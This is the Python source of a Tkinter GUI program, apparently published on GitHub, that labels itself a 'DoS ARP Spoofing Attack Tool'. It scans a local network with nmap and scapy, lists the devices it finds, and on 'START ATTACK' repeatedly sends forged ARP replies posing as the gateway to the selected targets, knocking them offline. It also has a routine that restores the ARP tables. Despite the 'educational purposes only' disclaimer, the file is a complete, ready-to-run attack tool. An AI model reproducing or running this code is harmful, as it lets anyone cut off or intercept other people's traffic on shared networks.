# Copyright (c) ImP4x_O 2025. All rights reserved.
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# ES:
#     - No tocar ni modificar el código a continuación. Si hay un error, por favor contactar al propietario, pero bajo ninguna circunstancia debe tocar el código.
#     - No revender esta herramienta, no acreditar como suya.
#     - No nos hacemos responsables del uso indebido de esta herramienta. Solo para fines educativos y pruebas en redes propias.
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances you should touch the code.
#     - Do not resell this tool, do not credit it to yours.
#     - We are not responsible for misuse of this tool. Educational purposes and testing on own networks only.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
#     - Nous ne sommes pas responsables de l'utilisation abusive de cet outil. À des fins éducatives et de test sur ses propres réseaux uniquement.
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# DISCLAIMER / DESCARGO DE RESPONSABILIDAD / AVIS DE NON-RESPONSABILITÉ:
# ES: Esta herramienta es solo para propósitos educativos. El uso en redes sin autorización es ilegal.
# EN: This tool is for educational purposes only. Use on unauthorized networks is illegal.
# FR: Cet outil est à des fins éducatives seulement. L'utilisation sur des réseaux non autorisés est illégale.
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import subprocess
import socket
import ipaddress
import time
import platform
import re
from concurrent.futures import ThreadPoolExecutor
import nmap
from scapy.all import ARP, Ether, srp, send

class DoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("IMPXO")
        self.root.geometry("900x900")
        self.root.configure(bg="black")
        self.devices = []
        self.selected_devices = []
        self.attack_running = False
        self.gateway_ip = ""
        self.local_ip = ""
        self.attack_threads = []
        self.detect_network_info()
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def detect_network_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            if platform.system() == "Windows":
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                gateway = None
                for line in result.stdout.split('\n'):
                    if "Puerta de enlace" in line or "Gateway" in line:
                        parts = line.split(":")
                        if len(parts) == 2 and parts[1].strip() and parts[1].strip() != '0.0.0.0':
                            gateway = parts[1].strip()
                            break
                self.gateway_ip = gateway if gateway else "192.168.1.1"
            else:
                self.gateway_ip = "192.168.1.1"
        except:
            self.local_ip = "192.168.1.100"
            self.gateway_ip = "192.168.1.1"

    def create_widgets(self):
        ascii_frame = tk.Frame(self.root, bg="black")
        ascii_frame.pack(pady=10)
        ascii_text = """                                              
 ██▓ ███▄ ▄███▓ ██▓███  ▒██   ██▒ ▒█████  
▓██▒▓██▒▀█▀ ██▒▓██░  ██▒▒▒ █ █ ▒░▒██▒  ██▒
▒██▒▓██    ▓██░▓██░ ██▓▒░░  █   ░▒██░  ██▒
░██░▒██    ▒██ ▒██▄█▓▒ ▒ ░ █ █ ▒ ▒██   ██░
░██░▒██▒   ░██▒▒██▒ ░  ░▒██▒ ▒██▒░ ████▓▒░
░▓ ▒░ ▒░  ░▒  ░░▓▒░ ░  ░▒▒ ░ ░▓ ░░ ▒░▒░▒░ 
 ▒ ░░  ░   ░  ░░▒ ░     ░░   ░▒ ░  ░ ▒ ▒░ 
 ▒ ░░      ░   ░░        ░    ░  ░ ░ ░ ▒  
 ░         ░             ░    ░      ░ ░ 
                           
        """
        ascii_label = tk.Label(ascii_frame, text=ascii_text, font=("Courier", 10), fg="red", bg="black", justify="center") 
        ascii_label.pack()
        github_label = tk.Label(self.root, text="github.com/ImP4x/DoS-ARP-Spoofing-Tool.git", font=("Arial", 14), fg="#FFFFFF", bg="black")
        github_label.pack(pady=(0, 10))
        attack_title = tk.Label(self.root, text="DoS ARP Spoofing Attack Tool", font=("Arial", 16), fg="red", bg="black")
        attack_title.pack(anchor="w", padx=20, pady=(10, 5))
        config_frame = tk.Frame(self.root, bg="gray", relief="flat", bd=0)
        config_frame.pack(pady=10, padx=20, fill="x")
        ip_frame = tk.Frame(config_frame, bg="gray")
        ip_frame.pack(pady=5, fill="x")
        tk.Label(ip_frame, text="IP Range:", fg="black", bg="gray", font=("Arial", 10, "bold")).pack(side="left", padx=5)
        self.ip_start = tk.Entry(ip_frame, width=15, relief="flat", bd=1)
        self.ip_start.pack(side="left", padx=2)
        ip_base = ".".join(self.local_ip.split(".")[:-1])
        self.ip_start.insert(0, f"{ip_base}.1")
        tk.Label(ip_frame, text="to", fg="black", bg="gray").pack(side="left", padx=5)
        self.ip_end = tk.Entry(ip_frame, width=15, relief="flat", bd=1)
        self.ip_end.pack(side="left", padx=2)
        self.ip_end.insert(0, f"{ip_base}.254")
        self.scan_btn = tk.Button(ip_frame, text="Scan", bg="red", fg="black", font=("Arial", 10, "bold"), command=self.scan_network, relief="flat", bd=0, highlightthickness=0)
        self.scan_btn.pack(side="right", padx=10)
        devices_frame = tk.Frame(self.root, bg="black")
        devices_frame.pack(pady=0, padx=20, fill="both", expand=True)
        selection_frame = tk.Frame(devices_frame, bg="black")
        selection_frame.pack(fill="x", pady=5)
        tk.Label(selection_frame, text="Devices Found:", fg="white", bg="black", font=("Arial", 12, "bold")).pack(side="left")
        self.select_all_btn = tk.Button(selection_frame, text="Select All", bg="#791402", fg="white", font=("Arial", 9, "bold"), command=self.select_all_devices, relief="flat", bd=0, highlightthickness=0)
        self.select_all_btn.pack(side="right", padx=5)
        self.clear_selection_btn = tk.Button(selection_frame, text="Clear Selection", bg="#791402", fg="white", font=("Arial", 9, "bold"), command=self.clear_selection, relief="flat", bd=0, highlightthickness=0)
        self.clear_selection_btn.pack(side="right", padx=5)
        self.devices_tree = ttk.Treeview(devices_frame, columns=("IP", "Hostname", "MAC"), show="headings", height=8)
        self.devices_tree.heading("IP", text="IP Address")
        self.devices_tree.heading("Hostname", text="Hostname")
        self.devices_tree.heading("MAC", text="MAC Address")
        self.devices_tree.pack(fill="both", expand=True, pady=5)
        scrollbar = ttk.Scrollbar(devices_frame, orient="vertical", command=self.devices_tree.yview)
        self.devices_tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side="right", fill="y")
        buttons_frame = tk.Frame(self.root, bg="black")
        buttons_frame.pack(pady=10)
        self.start_btn = tk.Button(buttons_frame, text="START ATTACK", bg="red", fg="black", font=("Arial", 12, "bold"), width=15, command=self.start_attack, relief="flat", bd=0, highlightthickness=0)
        self.start_btn.pack(side="left", padx=10)
        self.stop_btn = tk.Button(buttons_frame, text="STOP ATTACK", bg="red", fg="black", font=("Arial", 12, "bold"), width=15, command=self.stop_attack, relief="flat", bd=0, highlightthickness=0)
        self.stop_btn.pack(side="left", padx=10)
        self.stop_btn.config(state="disabled")
        logs_frame = tk.Frame(self.root, bg="black")
        logs_frame.pack(pady=10, padx=20, fill="both", expand=True)
        tk.Label(logs_frame, text="Logs:", fg="white", bg="black", font=("Arial", 12, "bold")).pack(anchor="w")
        self.log_text = scrolledtext.ScrolledText(logs_frame, height=8, bg="black", fg="lime", font=("Courier", 9), relief="flat", bd=1)
        self.log_text.pack(fill="both", expand=True)
        self.log("Aplicación iniciada correctamente")
        self.log(f"IP Local detectada: {self.local_ip}")
        self.log(f"Gateway detectado: {self.gateway_ip}")
        self.devices_tree.bind("<Button-1>", self.on_device_click)
        self.devices_tree.bind("<Control-Button-1>", self.on_device_ctrl_click)

    def select_all_devices(self):
        for item in self.devices_tree.get_children():
            self.devices_tree.selection_add(item)
        self.update_selected_devices()
        self.log("✎ Todos los dispositivos seleccionados")

    def clear_selection(self):
        self.devices_tree.selection_remove(self.devices_tree.selection())
        self.selected_devices = []
        self.log("✎ Selección limpiada")

    def on_device_click(self, event):
        self.update_selected_devices()

    def on_device_ctrl_click(self, event):
        self.update_selected_devices()

    def update_selected_devices(self):
        selection = self.devices_tree.selection()
        self.selected_devices = []
        for item in selection:
            values = self.devices_tree.item(item, 'values')
            if values:
                self.selected_devices.append(values[0])
        if self.selected_devices:
            self.log(f"Dispositivos seleccionados: {', '.join(self.selected_devices)}")

    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update_idletasks()

    def get_vendor_from_mac(self, mac):
        vendors = {
            "00:50:56": "VMware",
            "08:00:27": "VirtualBox",
            "52:54:00": "QEMU",
            "00:15:5D": "Microsoft Hyper-V",
            "00:1C:42": "Parallels",
            "E4:AB:89": "Samsung Galaxy",
            "9E:B0:81": "Xiaomi Phone",
            "D8:74:EF": "Huawei Phone",
            "00:A5:54": "Apple iPhone/iPad",
            "04:C8:07": "Samsung Mobile",
            "88:E9:FE": "Apple iPhone",
            "B0:72:BF": "Samsung Galaxy",
            "AC:BC:32": "Apple iPhone",
            "68:AB:1E": "Apple iPhone",
            "F4:F5:DB": "Samsung Phone",
            "00:25:00": "Apple iPhone",
            "28:CF:E9": "Apple iPhone/iPad",
            "F0:DB:E2": "Apple iPhone/iPad",
            "CC:29:F5": "Apple iPhone/iPad",
            "8C:85:90": "Apple iPhone/iPad",
            "00:17:F2": "Apple iPhone/iPad",
            "3C:07:54": "Apple iPhone/iPad",
            "28:E0:2C": "Apple iPhone/iPad",
            "00:21:CC": "Dell Laptop",
            "B8:AE:ED": "Dell Computer",
            "54:E1:AD": "Dell Computer",
            "18:03:73": "Dell Computer",
            "84:8F:69": "Dell Computer",
            "00:26:B9": "Dell Computer",
            "E4:11:5B": "Hewlett Packard",
            "70:5A:B6": "HP Computer",
            "98:90:96": "HP Computer",
            "4C:52:62": "HP Computer",
            "00:23:7D": "HP Computer",
            "70:F3:95": "Lenovo Computer",
            "00:21:5C": "Lenovo Computer",
            "54:05:DB": "Lenovo Computer",
            "B0:83:FE": "Lenovo Computer",
            "00:90:F5": "ASUS Computer",
            "04:92:26": "ASUS Computer",
            "1C:87:2C": "ASUS Computer",
            "00:1F:C6": "ASUS Computer",
            "00:07:AB": "Samsung TV",
            "7C:64:56": "Samsung Smart TV",
            "04:5D:4B": "LG Smart TV",
            "60:FB:42": "LG Smart TV",
            "CC:3E:5F": "LG Smart TV",
            "00:1E:75": "LG Smart TV",
            "00:26:CC": "Sony TV",
            "94:65:2D": "Sony Smart TV",
            "50:A4:C8": "Sony TV",
            "00:09:D6": "Philips TV",
            "00:02:55": "Philips Smart TV",
            "EC:41:18": "TCL Smart TV",
            "C8:21:58": "TCL Smart TV",
            "70:F9:27": "Hisense TV",
            "50:8A:06": "Panasonic TV",
            "00:80:45": "Panasonic TV",
            "00:09:BF": "Nintendo Switch/Wii",
            "98:B6:E9": "Nintendo Switch",
            "00:17:AB": "Nintendo Wii",
            "00:19:1D": "Nintendo DS",
            "00:25:A0": "Nintendo 3DS",
            "40:F4:07": "Nintendo Switch",
            "00:0D:3C": "Microsoft Xbox",
            "7C:ED:8D": "Microsoft Xbox",
            "98:5F:D3": "Microsoft Xbox One",
            "00:50:F2": "Microsoft Xbox 360",
            "E8:99:C4": "Microsoft Xbox One",
            "00:04:61": "Sony PlayStation",
            "FC:0F:E6": "Sony PlayStation 4",
            "B8:78:2E": "Sony PlayStation 4",
            "C4:04:15": "Sony PlayStation 5",
            "A8:40:41": "Linksys Router",
            "20:AA:4B": "Linksys Router",
            "00:14:BF": "Linksys Router",
            "00:18:39": "Linksys Router",
            "C0:56:27": "NETGEAR Router",
            "00:09:5B": "NETGEAR Router",
            "44:94:FC": "NETGEAR Router",
            "20:E5:2A": "NETGEAR Router",
            "E8:FC:AF": "TP-Link Router",
            "50:C7:BF": "TP-Link Router",
            "00:27:19": "TP-Link Router",
            "AC:15:A2": "TP-Link Router",
            "40:31:3C": "D-Link Router",
            "00:05:5D": "D-Link Router",
            "54:B8:0A": "D-Link Router",
            "00:17:9A": "D-Link Router",
            "EC:17:2F": "ASUS Router",
            "2C:56:DC": "ASUS Router",
            "00:1D:60": "ASUS Router",
            "18:B4:30": "Amazon Echo/Alexa",
            "FC:A1:83": "Amazon Echo/Alexa",
            "F0:D2:F1": "Google Home/Nest",
            "6C:AD:F8": "Google Nest",
            "18:B7:9E": "Google Chromecast",
            "DA:A1:19": "Google Chromecast",
            "AC:63:BE": "Amazon Fire TV",
            "74:C6:3B": "Amazon Fire TV",
            "00:FC:8B": "Amazon Fire Stick",
            "B0:A7:37": "Roku Device",
            "DC:3A:5E": "Roku TV",
            "CC:6D:A0": "Roku Player",
            "00:12:12": "Hikvision Camera",
            "44:19:B6": "Hikvision Camera",
            "BC:AD:28": "Hikvision Camera",
            "28:57:BE": "Dahua Camera",
            "00:80:F0": "Panasonic Camera",
            "00:02:D1": "Vivotek Camera",
            "00:0F:7C": "Netgear Camera",
            "00:04:76": "Canon Printer",
            "00:26:73": "Canon Printer",
            "68:17:29": "Canon Printer",
            "00:00:48": "Epson Printer",
            "64:00:F1": "Epson Printer",
            "04:F0:21": "Epson Printer",
            "00:01:E3": "Brother Printer",
            "00:80:77": "Brother Printer",
            "30:05:5C": "Brother Printer",
            "E2:31:E4": "Unknown WiFi Device",
            "00:00:00": "Broadcast Address",
            "FF:FF:FF": "Broadcast Address",
            "02:00:00": "Local Admin",
            "06:00:00": "Local Admin",
            "0A:00:00": "Local Admin",
            "0E:00:00": "Local Admin",
            "B8:27:EB": "Raspberry Pi",
            "DC:A6:32": "Raspberry Pi",
            "E4:5F:01": "Raspberry Pi",
            "28:CD:C1": "Raspberry Pi"
        }
        mac_prefix = mac[:8] if len(mac) >= 8 else mac
        return vendors.get(mac_prefix, None)

    def get_device_info(self, ip):
        hostname = "Unknown"
        mac = "Unknown"
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            pass
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            answered = srp(packet, timeout=2, verbose=0)[0]
            for sent, received in answered:
                mac = received.hwsrc.upper()
        except:
            pass
        # Obtener fabricante si hostname desconocido
        if mac != "Unknown" and hostname == "Unknown":
            vendor = self.get_vendor_from_mac(mac)
            if vendor:
                hostname = f"{vendor} Device"
        return hostname, mac

    def scan_network(self):
        self.log(" Iniciando escaneo de red con nmap...")
        self.scan_btn.config(state="disabled", text="Scanning...")
        for item in self.devices_tree.get_children():
            self.devices_tree.delete(item)
        self.devices = []

        def scan_thread():
            try:
                start_ip = ipaddress.IPv4Address(self.ip_start.get())
                end_ip = ipaddress.IPv4Address(self.ip_end.get())
                ip_base = ".".join(str(start_ip).split(".")[:-1])
                range_start = int(str(start_ip).split(".")[-1])
                range_end = int(str(end_ip).split(".")[-1])
                host_range = f"{ip_base}.{range_start}-{range_end}"
                nm = nmap.PortScanner()
                self.log(f"🛧 Escaneando rango: {host_range} ...")
                nm.scan(hosts=host_range, arguments='-sn')
                count = 0
                for host in nm.all_hosts():
                    ip = host
                    mac = nm[host]['addresses'].get('mac', 'Unknown')
                    hostname = nm[host].get('hostnames', [{'name': 'Unknown'}])[0]['name']
                    if not hostname or hostname == '':
                        hostname = "Unknown"
                    self.devices.append({"ip": ip, "hostname": hostname, "mac": mac})
                    self.devices_tree.insert("", "end", values=(ip, hostname, mac))
                    self.log(f"☑ Dispositivo encontrado: {ip} - {hostname}")
                    count += 1
                self.log(f"☑ Escaneo completado. {count} dispositivos encontrados.")
            except Exception as e:
                self.log(f"☒ Error en el escaneo: {str(e)}")
            finally:
                self.scan_btn.config(state="normal", text="Scan")

        threading.Thread(target=scan_thread, daemon=True).start()

    def arp_spoof(self, target_ip, target_mac):
        try:
            self.log(f"☠ Ataque iniciado contra {target_ip}")
            while self.attack_running:
                arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
                send(arp_response, verbose=0)
                time.sleep(2)
        except Exception as e:
            self.log(f"✘ Error en ataque a {target_ip}: {str(e)}")

    def start_attack(self):
        if not self.selected_devices:
            messagebox.showwarning("Advertencia", "Selecciona al menos un dispositivo objetivo")
            return
        if not self.gateway_ip:
            messagebox.showerror("Error", "No se pudo detectar el gateway")
            return
        targets = []
        for ip in self.selected_devices:
            mac = None
            for dev in self.devices:
                if dev['ip'] == ip:
                    mac = dev['mac']
                    break
            if mac and mac != "Unknown":
                targets.append({'ip': ip, 'mac': mac})
            else:
                self.log(f"⊘ No se pudo obtener MAC de {ip}. Se omitirá en ataque.")
        if not targets:
            messagebox.showerror("Error", "No se pudo obtener MAC de ningún dispositivo para atacar")
            return
        self.attack_running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.log(" === INICIANDO ATAQUE ARP SPOOFING ===")
        self.log(f"➥ Objetivos: {', '.join([t['ip'] for t in targets])}")
        self.log(f"➥ Gateway: {self.gateway_ip}")
        self.attack_threads.clear()
        def attack_wrapper(target):
            self.arp_spoof(target['ip'], target['mac'])
        for target in targets:
            t = threading.Thread(target=attack_wrapper, args=(target,), daemon=True)
            self.attack_threads.append(t)
            t.start()

    def stop_attack(self):
        if not self.attack_running:
            return
        self.log("⌦ DETENIENDO ATAQUE INMEDIATAMENTE...")
        self.attack_running = False
        for t in self.attack_threads:
            t.join(timeout=3)
        self.attack_threads.clear()
        self.log("✉ Enviando paquetes ARP para restaurar...")
        for device in self.devices:
            if device['ip'] in self.selected_devices and device['mac'] != "Unknown":
                self.restore_arp(device['ip'], device['mac'])
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("✔ ATAQUE DETENIDO Y TABLA ARP RESTAURADA")

    def restore_arp(self, target_ip, target_mac):
        try:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=self.get_mac(self.gateway_ip))
            send(arp_response, count=5, verbose=0)
            self.log(f"✔ ARP restaurado para {target_ip}")
        except Exception as e:
            self.log(f"☢  Error restaurando ARP de {target_ip}: {str(e)}")

    def get_mac(self, ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            answered = srp(packet, timeout=2, verbose=0)[0]
            for sent, received in answered:
                return received.hwsrc.upper()
        except:
            return None

    def on_closing(self):
        if self.attack_running:
            self.log("⌦ Deteniendo ataques antes de cerrar...")
            self.stop_attack()
            time.sleep(1)
        self.root.destroy()

def main():
    root = tk.Tk()
    app = DoSApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
